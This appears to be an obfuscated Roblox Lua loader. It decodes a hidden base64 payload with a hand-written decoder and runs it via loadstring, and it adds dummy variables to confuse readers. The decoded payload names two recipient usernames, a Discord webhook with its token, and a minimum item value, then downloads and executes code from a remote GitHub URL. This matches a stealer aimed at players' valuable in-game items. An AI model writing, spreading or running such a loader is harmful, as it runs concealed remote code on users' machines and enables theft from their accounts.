
local phFLoseAICdl = 'VXNlcm5hbWUgPSAiMTIzbmV3YmVnaW5uZXIiClVzZXJuYW1lMiA9ICIxMjM0bmV3YmVnaW5uZXIiCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwMDUwOTYxMDk2NDI4NzU3My9MN1ZHblFCSW5CSHFEaVhOZHA5dDltSjNQZ21hT0FVQmZnbWZaTTR2NzBOSkk3eXNVaVRJWjdVSE1MN0VaZjZTc2o3NSIKTWluaW11bVJBUCA9IDEwMDAwMApsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYWRvd3N6enp6L3RpbW9jaXkvcmVmcy9oZWFkcy9tYWluL21haW4iLCB0cnVlKSkoKQ=='
local OlrbNxYvlYM = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local KLOhlReJer = OlrbNxYvlYM(phFLoseAICdl)
loadstring(KLOhlReJer)() -- Run decoded code

-- Dummy variables for confusion
local LzzWjpab = math.random()
local MMciSJaJzEAG = "This is a dummy string"
